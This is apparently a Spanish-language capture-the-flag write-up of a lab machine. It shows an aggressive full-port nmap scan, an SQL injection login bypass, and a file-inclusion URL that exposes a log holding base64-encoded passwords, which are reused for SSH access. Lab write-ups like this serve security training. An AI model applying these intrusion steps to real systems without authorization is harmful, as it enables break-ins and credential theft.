# Info
## IP Víctima
```
172.17.0.2
```
## Usuarios
### Albert
```
albert
```
```
NGxiM3J0MTIz
```
# Writeup
## Recon
Comenzamos por lanzar el siguiente comando:
```bash
nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmap_TCP.xml && xsltproc nmap_TCP.xml -o nmap_TCP.html && open nmap_TCP.html &>/dev/null & disown
```
Con él, la idea es hacer un escaneo de todos los puertos abiertos en la máquina víctima, de manera agresiva e identificando versiones de los servicios. Obtenemos el siguiente output del escaneo en cuestión
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:a8:42:e7:2b:2f:7a:f9:50:bd:6d:31:8e:36:54:7b (ECDSA)
|_  256 c0:ff:28:31:a3:0b:1a:3d:c3:5f:83:1b:3c:44:28:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login Panel
|_Requested resource was login.php
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
Vemos un puerto 22 corriendo SSH y un servidor HTTP que en principio debería estar sirviendo un panel de login. Al visitar la página me encuentro con solo un formulario de login, a primera vista no veo nada raro en el código fuente, por lo que voy a lanzar un fuzzeo en busca de directorios ocultos y otra información que pueda ser relevante mientras voy probando cosas en el formulario como credenciales por defecto comunes, inyecciones y demás.
Probando SQLi con [el repo de payloadbox](https://github.com/payloadbox) en el campo de password entro al panel de administrador al primer intento. Al revisar el código me encuentro con la siguiente nota:
```html
<!-- dev note: remember to secure logs.txt path before deploy -->
```
## Exploit
Del escaneo previo había encontrado la ruta /logs, de manera que introduzco la URL http://172.17.0.2/index.php?page=/logs/logs.txt y me encuentro con lo estos logs:
```
[2024-03-29 12:04:12] ERROR: Login failed for user 'root' [2024-03-29 12:04:12] DEBUG: Trying password 'YWRtaW4xMjM=' [2024-03-29 12:04:13] ERROR: Login failed for user 'admin' [2024-03-29 12:04:14] DEBUG: Trying password 'dGVzdDEyMw==' [2024-03-29 12:04:16] ERROR: Login failed for user 'test' [2024-03-29 12:04:18] DEBUG: Login failed from IP 10.10.14.8 [2024-03-29 12:04:19] DEBUG: Login failed from IP 10.10.14.9 [2024-03-29 12:04:20] DEBUG: Login failed from IP 10.10.14.10 [2024-03-29 12:04:21] DEBUG: Login failed from IP 10.10.14.11 [2024-03-29 12:04:22] WARNING: Too many login attempts [2024-03-29 12:04:23] ERROR: Login attempt for user 'albert' [2024-03-29 12:04:24] DEBUG: Trying password 'NGxiM3J0MTIz' [2024-03-29 12:04:25] SUCCESS: Auth success for user 'albert' [2024-03-29 12:04:26] DEBUG: Session token issued: 38b2fdcbffe78b9989f3e [2024-03-29 12:04:27] DEBUG: SSH connection established from 10.10.14.8 [2024-03-29 12:04:28] DEBUG: User 'albert' added to sudo group [2024-03-29 12:04:29] DEBUG: File accessed: /var/www/html/index.php?page=welcome [2024-03-29 12:04:30] DEBUG: File accessed: /etc/passwd [2024-03-29 12:04:31] DEBUG: File accessed: /var/log/auth.log [2024-03-29 12:04:32] DEBUG: File accessed: /var/www/html/login.php [2024-03-29 12:04:33] DEBUG: File accessed: /var/www/html/logs/logs.txt [2024-03-29 12:04:34] WARNING: Potential exposure of file logs.txt [2024-03-29 12:04:35] WARNING: logs.txt contains sensitive authentication data [2024-03-29 12:04:36] [!!!] SECURITY ALERT: logs/logs.txt is PUBLICLY EXPOSED [2024-03-29 12:04:37] [!!!] Use this file with caution credentials may be compromised
```
El inicio de sesión del usuario Albert con su respectiva contraseña están expuestos en este archivo, por lo que ya podemos entrar mediante ssh a la máquina víctima.
## Post
El usuario en Alberto no tiene sudo
